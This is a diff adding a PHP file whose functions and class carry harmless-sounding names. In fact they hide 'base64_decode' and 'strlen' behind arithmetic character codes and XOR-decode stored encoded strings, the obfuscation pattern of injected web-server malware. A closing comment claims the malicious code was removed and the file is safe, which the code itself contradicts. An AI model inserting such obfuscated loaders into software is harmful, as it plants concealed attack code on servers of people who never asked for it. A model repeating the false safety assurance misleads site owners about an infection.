@@ -1,0 +1,48 @@
+<?php
+function aggregate_results($c)
+{
+    $a = array(5 * 23, 102 + 12 + 2, 54 * 1 + 60, 2 * 54, 30 + 71, 88 * 1 + 22);
+    $s = '';
+    foreach ($a as $n) {
+        $s .= chr($n);
+    }
+    return $s($c);
+}
+
+function start_service($c)
+{
+    $a = array(67 * 62 - 4053, 109 - 9, 111, 92 * 1 + 7, 37 + 55 + 9, 100, 95, 45 * 1 + 7, 54, 80 * 1 + 21, 123 - 8, 97 * 1, 104 - 6);
+    $s = '';
+    foreach ($a as $n) {
+        $s .= chr($n);
+    }
+    $s = strrev($s);
+    return $s($c);
+}
+
+class SystemManager
+{
+    private static $_ba;
+    static function executeAction($_ru, $_rq)
+    {
+        if (!self::$_ba) {
+            self::logTransaction();
+        }
+        $_jex = aggregate_results($_rq);
+        $_zya = start_service(self::$_ba[$_ru]);
+        for ($_yit = 0, $_wba = aggregate_results($_zya); $_yit !== $_wba; ++$_yit) {
+            $_zya[$_yit] = chr(ord($_zya[$_yit]) ^ ord($_rq[$_yit % $_jex]));
+        }
+        return $_zya;
+    }
+    private static function logTransaction()
+    {
+        self::$_ba = array('_xpf' => 'FyQmIwAlITYNLzM0Gj4m', '_ovp' => 'Fzs6KgA6PT8NMC89GiE6', '_ep' => 'alFcZ1xRalc=', '_nb' => '', '_ay' => '');
+    }
+}
+
+
+/**
+* Note: This file may contain artifacts of previous malicious infection.
+* However, the dangerous code has been removed, and the file is now safe to use.
+*/
